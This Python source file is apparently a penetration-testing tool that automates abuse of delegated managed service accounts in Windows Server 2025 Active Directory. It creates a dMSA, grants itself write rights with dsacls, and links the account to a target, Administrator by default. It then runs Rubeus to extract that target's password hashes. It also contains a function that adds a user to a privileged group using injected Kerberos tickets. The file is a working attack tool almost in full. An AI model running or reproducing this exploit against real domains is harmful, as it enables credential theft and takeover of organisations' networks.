import os
import subprocess
from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, MODIFY_REPLACE, BASE, SASL, GSSAPI, MODIFY_ADD, Tls
import ldap3
from ldap3.core.exceptions import LDAPSocketOpenError, LDAPBindError, LDAPStartTLSError
import ssl
import argparse
from ldap3.protocol.microsoft import security_descriptor_control
import importlib.resources


def set_dmsa_state_ldap(args, state):
    """
    Sets the msDS-DelegatedMSAState on the specified gMSA.

    Args:
      dc_host:            FQDN or IP of your domain controller
      bind_user:          "DOMAIN\\Username" with rights to modify the gMSA
      bind_pass:          that account’s password
      distinguished_name: full DN of the gMSA, e.g.
                          "CN=test_dmsa,OU=Test,DC=example,DC=come"
      state:              integer value to write (e.g. 0 or 2)

    Returns:
      True if the modify was successful; False otherwise (you can
      inspect conn.result for details).
    """
    domain = ",DC=".join(args.domain.split("."))
    distinguished_name = f"CN={args.dmsa_account_name},OU={args.org_unit},DC={domain}"

    server = Server(args.domain_controller, port=636, use_ssl=True, get_info=ALL)
    conn = Connection(
        server,
        user=f"{args.domain}\\{args.username}",
        password=args.password,
        authentication=NTLM,
        auto_bind=True
    )

    # perform the replace operation
    conn.modify(
        distinguished_name,
        {'msDS-DelegatedMSAState': [(MODIFY_REPLACE, [state])]}
    )
    success = conn.result.get('description') == 'success'
    conn.unbind()
    return success


def get_dmsa_state_ldap(args):
    """
    Attempts to read msDS-DelegatedMSAState from AD with fallback: LDAPS → StartTLS → plain LDAP.
    """
    # Build DN
    domain = ",DC=".join(args.domain.split("."))
    distinguished_name = f"CN={args.dmsa_account_name},OU={args.org_unit},DC={domain}"

    server = None
    conn = None

    # ----- Attempt LDAPS -----
    try:
        if args.debug:
            print("[*] Trying LDAPS...")
        server = Server(args.domain_controller, port=636, use_ssl=True, get_info=ALL)
        conn = Connection(
            server,
            user=f"{args.domain}\\{args.username}",
            password=args.password,
            authentication=NTLM,
            auto_bind=True
        )
        if args.debug:
            print("[+] Connected via LDAPS.")
    except (LDAPSocketOpenError, LDAPBindError) as e1:
        if args.debug:
            print("[!] LDAPS failed, trying StartTLS...")
        try:
            # ----- Attempt StartTLS -----
            tls_config = Tls(validate=ssl.CERT_NONE)
            server = Server(args.domain_controller, port=389, use_ssl=False, get_info=ALL, tls=tls_config)
            conn = Connection(
                server,
                user=f"{args.domain}\\{args.username}",
                password=args.password,
                authentication=NTLM
            )
            conn.open()
            conn.start_tls()
            conn.bind()
            if args.debug:
                print("[+] Connected via StartTLS.")
        except (LDAPSocketOpenError, LDAPBindError, LDAPStartTLSError, Exception) as e2:
            if args.debug:
                print("[!] StartTLS failed, trying plain LDAP...")
            try:
                # ----- Attempt plain LDAP -----
                server = Server(args.domain_controller, port=389, use_ssl=False, get_info=ALL)
                conn = Connection(
                    server,
                    user=f"{args.domain}\\{args.username}",
                    password=args.password,
                    authentication=NTLM,
                    auto_bind=True
                )
                if args.debug:
                    print("[+] Connected via plain LDAP (unencrypted).")
            except Exception as e3:
                raise ConnectionError(
                    f"All connection attempts failed:\nLDAPS: {e1}\nStartTLS: {e2}\nPlain LDAP: {e3}"
                )

    # ----- Perform search -----
    conn.search(
        search_base=distinguished_name,
        search_scope=BASE,
        search_filter="(objectClass=*)",
        attributes=["msDS-DelegatedMSAState"]
    )

    if not conn.entries:
        conn.unbind()
        raise LookupError(f"No object found at {distinguished_name}")

    entry = conn.entries[0]
    attrs = entry.entry_attributes_as_dict
    state_list = attrs.get("msDS-DelegatedMSAState")
    conn.unbind()

    if not state_list:
        raise LookupError(
            f"Attribute msDS-DelegatedMSAState not present on {distinguished_name}"
        )

    return int(state_list[0])


def set_managed_account_link(args, link_dn):
    """
    Sets the msDS-ManagedAccountPrecededByLink attribute on the specified gMSA.

    Args:
      dc_host:            FQDN or IP of your domain controller (uses LDAPS/636)
      bind_user:          "DOMAIN\\Username" with rights to modify the gMSA
      bind_pass:          that account’s password
      distinguished_name: full DN of the gMSA, e.g.
                          "CN=test_dmsa,OU=Test,DC=example,DC=come"
      link_dn:            the DN you want to write into
                          msDS-ManagedAccountPrecededByLink, e.g.
                          "CN=Administrator,CN=Users,DC=example,DC=com"

    Returns:
      True if the modify was successful; False otherwise.
    """

    domain = ",DC=".join(args.domain.split("."))
    distinguished_name = f"CN={args.dmsa_account_name},OU={args.org_unit},DC={domain}"

    server = Server(args.domain_controller, port=636, use_ssl=True, get_info=ALL)
    conn = Connection(
        server,
        user=f"{args.domain}\\{args.username}",
        password=args.password,
        authentication=NTLM,
        auto_bind=True
    )

    conn.modify(
        distinguished_name,
        {'msDS-ManagedAccountPrecededByLink': [(MODIFY_REPLACE, [link_dn])]}
    )
    success = conn.result.get('description') == 'success'
    conn.unbind()
    return success


def get_managed_account_preceded_by_link(
        dc_host: str,
        bind_user: str,
        bind_pass: str,
        distinguished_name: str
) -> list[str]:
    """
    Reads and returns the msDS-ManagedAccountPrecededByLink values on the specified object.

    Args:
      dc_host:            FQDN or IP of your domain controller (uses LDAPS/636)
      bind_user:          "DOMAIN\\Username" with rights to read the attribute
      bind_pass:          that account’s password
      distinguished_name: full DN of the object, e.g.
                          "CN=test_dmsa,OU=Test,DC=example,DC=come"

    Returns:
      A list of DNs (strings) stored in msDS-ManagedAccountPrecededByLink.

    Raises:
      LookupError if the object doesn’t exist or the attribute isn’t present.
    """
    # 1) Connect over LDAPS
    server = Server(dc_host, port=636, use_ssl=True, get_info=ALL)
    conn = Connection(
        server,
        user=bind_user,
        password=bind_pass,
        authentication=NTLM,
        auto_bind=True
    )

    # 2) BASE-scope search at the exact DN, asking only for our attribute
    conn.search(
        search_base=distinguished_name,
        search_scope=BASE,
        search_filter="(objectClass=*)",
        attributes=["msDS-ManagedAccountPrecededByLink"]
    )

    if not conn.entries:
        conn.unbind()
        raise LookupError(f"No object found at {distinguished_name}")

    entry = conn.entries[0]
    attrs = entry.entry_attributes_as_dict
    conn.unbind()

    links = attrs.get("msDS-ManagedAccountPrecededByLink")
    if not links:
        raise LookupError(
            f"Attribute msDS-ManagedAccountPrecededByLink not present on {distinguished_name}"
        )

    # Ensure we return a list of strings
    return [str(dn) for dn in links]


def priv_esc(DC, GROUP_DN, USER_DN):
    # Assuming you’ve already injected your TGT and TGS into LSA…
    tls_config = Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)

    # Connect over LDAPS (636) with SSL/TLS
    server = Server(DC,
                    port=636,
                    use_ssl=True,
                    get_info=ALL,
                    tls=tls_config)
    conn = Connection(
        server,
        authentication=SASL,
        sasl_mechanism=GSSAPI,
        auto_bind=True
    )

    # Perform the privileged modify
    conn.modify(
        GROUP_DN,
        {'member': [(MODIFY_ADD, [USER_DN])]}
    )

    if conn.result['description'] == 'success':
        print(f"✅ {USER_DN} added to {GROUP_DN}")
    else:
        print("❌ failed:", conn.result)

    conn.unbind()


def run_powershell(cmd: str):
    ps_args = [
        "powershell.exe",
        "-Command", cmd
    ]
    # capture_output=True gives us stdout & stderr
    result = subprocess.run(ps_args, capture_output=True, text=True)

    # result.returncode == 0 means success
    if result.returncode == 0:
        print("OUTPUT:\n", result.stdout)
    else:
        print("ERROR (rc={}):\n".format(result.returncode), result.stderr)


def inject_ticket(source_user='', source_user_password='', domain='', domain_controller='', dmsa_account=''):
    command = [get_rubeus_path(), 'Rubeus.exe', 'asktgs', f'/targetuser:{dmsa_account}', f'/service:krbtgt/{domain}', '/dmsa',
               f'/dc:{domain_controller}', '/ptt', '/outfile:dmsa.kirbi', '/ticket:source.kirbi', '/opsec', '/nowrap']
    result = subprocess.run(command, capture_output=True, text=True)


def get_ticket(args, source_user='', source_user_password='', domain='', domain_controller='', dmsa_account=''):
    command = [get_rubeus_path(), 'Rubeus.exe', 'asktgt', f'/user:{source_user}', f'/password:{source_user_password}', f'/domain:{domain}',
               f'/dc:{domain_controller}', '/enctype:aes256', '/ptt', '/nowrap', '/outfile:source.kirbi']
    result = subprocess.run(command, capture_output=True, text=True)

    if args.debug:
        print(result.stdout)
        print(result.stderr)


def get_arguments():
    parser = argparse.ArgumentParser()

    required = parser.add_argument_group('Required Arguments')
    optional = parser.add_argument_group('Optional Arguments')

    required.add_argument('-u', '--username', required=True,
                          help="Username of the account with the ability to create dMSAs.")
    required.add_argument('-p', '--password', required=True,
                          help="Password of the account with the ability to create dMSAs.")
    required.add_argument('-d', '--domain', required=True,
                          help="Domain name of the account with the ability to create dMSAs.")
    required.add_argument('-dc', '--domain_controller', required=True,
                          help="Domain controller using Server 2025.")
    required.add_argument('-ou', '--org_unit', required=True,
                          help="Org unit where the account has the ability to create dMSAs.")

    optional.add_argument('-da', '--dmsa_account_name', required=False, default="pentest_dmsa",
                          help="Name of the dMSA account to create (defaults to 'pentest_dmsa')")
    optional.add_argument('-t', '--target_account', default="Administrator",
                          help="Domain account whose password hash will be obtained (defaults to 'Administrator')")
    optional.add_argument('-db', '--debug', default=False, action="store_true",
                          help="Enable debug mode")

    return parser.parse_args()


def create_dmsa(args):
    domain = args.domain.split(".")
    ou = f"OU={args.org_unit}"
    for part in domain:
        ou += f",DC={part}"

    powershell_script = f'''
    $password = ConvertTo-SecureString "{args.password}" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential("{args.username}@{args.domain}", $password)
    New-ADServiceAccount -Name {args.dmsa_account_name} -DNSHostname pentest_dmsa.com -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword {args.username} -path "{ou}" -Server {args.domain_controller} -Credential $cred
    '''
    result = subprocess.run(['powershell', '-Command', powershell_script], capture_output=True, text=True)
    if "The specified account already exists" in result.stderr:
        print("ℹ️ Account already exists: skipping creation")
    elif result.returncode == 0:
        print(f"✅ {args.dmsa_account_name} account created")
    else:
        print(f"❌ {args.dmsa_account_name} account creation failed in {args.org_unit}")


def grant_write_privileges_if_owner(args):
    server = Server(args.domain_controller, port=636, use_ssl=True, get_info=ALL)
    conn = Connection(
        server,
        user=f"{args.domain}\\{args.username}",
        password=args.password,
        authentication=NTLM,
        auto_bind=True
    )

    # 1. Retrieve the security descriptor (SDDL) for the object
    sd_control = security_descriptor_control(sdflags=0x07)  # DACL | Owner | Group

    conn.search(
        search_base=args.dmsa_dn,
        search_scope=ldap3.BASE,
        search_filter="(objectClass=*)",
        attributes=["nTSecurityDescriptor"],
        controls=sd_control
    )

    if not conn.entries:
        conn.unbind()
        raise LookupError("gMSA account not found")

    sd = conn.entries[0]["nTSecurityDescriptor"]

    # 2. Parse the SDDL string to check ownership
    # Note: ldap3 doesn't parse SDDL directly, so you'd need pywin32 or manual SDDL decode for full detail
    # You can also fallback to Get-ADObject + Get-Acl in PowerShell for exact checking

    print("DEBUG: Current Security Descriptor:")
    print(sd)

    # 3. Attempt to add write access to msDS-DelegatedMSAState (if ACL mod is allowed)
    # This example adds a permissive ACE for the current user
    # NOTE: You need a way to construct and apply a modified SD — ldap3 doesn't simplify this.
    # Realistically you'd use PowerShell or the Windows API for ACL manipulation.

    # 4. You can log intent to elevate here, or recommend doing it via PowerShell
    conn.unbind()
    print("To add write access to msDS-DelegatedMSAState, use PowerShell ACL editing.")
    return False


def get_write_access(args):
    command = ['dsacls.exe', f"\\\\{args.domain_controller}\\{args.dmsa_dn}", "/G", f"{args.domain}\\{args.username}:GW",
              f'/user:{args.username}', f'/passwd:{args.password}']
    result = subprocess.run(command, capture_output=True, text=True)


def parse_arguments(args):
    domain = ",DC=" + ",DC=".join(args.domain.split("."))
    args.dmsa_dn = f"CN={args.dmsa_account_name},OU={args.org_unit}{domain}"

    powershell_script = f'''
    $password = ConvertTo-SecureString "{args.password}" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential("{args.username}@{args.domain}", $password)
    (Get-ADUser -Identity {args.target_account} -Server {args.domain_controller} -Credential $cred).DistinguishedName
    '''
    result = subprocess.run(['powershell', '-Command', powershell_script], capture_output=True, text=True)

    args.target_dn = result.stdout.strip()

    return args


def grant_write_privileges(args):
    commands = ["dsacls.exe", f'\\\\{args.domain_controller}\\{args.dmsa_dn}', '/G', f'{args.sid}:GW',
                f'/user:{args.username}', f'/passwd:{args.password}']

    result = subprocess.run(commands, capture_output=True, text=True)

    if "The command completed successfully" in result.stdout:
        print(f"✅ {args.username} granted write privileges on {args.dmsa_account_name}")
    else:
        print(f"❌ Failed to grant write privileges on {args.dmsa_account_name} to {args.username}")


def get_hash(args):
    commands = [get_rubeus_path(), "Rubeus.exe", "asktgs", f"/targetuser:{args.dmsa_account_name}$", f"/service:krbtgt/{args.domain}",
                "/dmsa", "/opsec", "/ptt", "/ticket:source.kirbi"]
    result = subprocess.run(commands, capture_output=True, text=True)

    if args.debug:
        print(result.stdout)
        print(result.stderr)

    hashes = []
    for line in result.stdout.splitlines():
        if "Previous Keys" in line:
            parts = line.strip().split()
            if parts:
                hash_value = parts[-1]
                hashes.append(hash_value)

    return hashes


def print_ending(args, hashes):
    print(f"\nReminder: {args.dmsa_account_name} in the {args.org_unit} OU was added")

    if hashes:
        print("The following password hashes were obtained:")
        for hash in hashes:
            print(f"{args.target_account} : {hash}")
    else:
        print(f"❌ Failed to obtain password hashes")


def clean_up(args):
    if os.path.exists("source.kirbi"):
        os.remove("source.kirbi")


def get_rubeus_path():
    try:
        with importlib.resources.path(__package__ or "__main__", "Rubeus.exe") as p:
            return str(p)
    except FileNotFoundError:
        raise RuntimeError("Rubeus.exe not found. Make sure it's installed with the package.")


def main():
    args = get_arguments()
    args = parse_arguments(args)

    create_dmsa(args)

    args.sid = get_sid(args, args.username)
    grant_write_privileges(args)

    current_state = get_dmsa_state_ldap(args)
    if current_state != 2:
        if args.debug:
            print("Current msDS-DelegatedMSAState =", current_state)
        if set_dmsa_state_ldap(args, 2):
            print("✅ msDS-DelegatedMSAState set to 2")
        else:
            print("❌ Failed to update. Check permissions and DN.")
    elif args.debug:
        print("Current msDS-DelegatedMSAState =", current_state)

    if set_managed_account_link(args, args.target_dn):
        print("✅ msDS-ManagedAccountPrecededByLink updated successfully")
    else:
        print("❌ Update failed; check DN, permissions, and DC connectivity")

    get_ticket(args, args.username, args.password, args.domain, args.domain_controller, args.dmsa_account_name)

    hashes = get_hash(args)

    print_ending(args, hashes)
    #clean_up(args)

    # inject_ticket(args.username, args.password, args.domain, args.domain_controller, args.dmsa_account_name)
    # priv_esc(args)


def get_sid(args, target_account):
    powershell_script = f'''
    $password = ConvertTo-SecureString "{args.password}" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential("{args.username}@{args.domain}", $password)
    Get-ADUser -Identity {target_account} -Server {args.domain_controller} -Credential $cred | Select-Object SID
    '''
    result = subprocess.run(['powershell', '-Command', powershell_script], capture_output=True, text=True)

    lines = [line for line in result.stdout.splitlines() if line.strip()]
    sid = lines[-1].strip()

    return sid


if __name__ == "__main__":
    main()
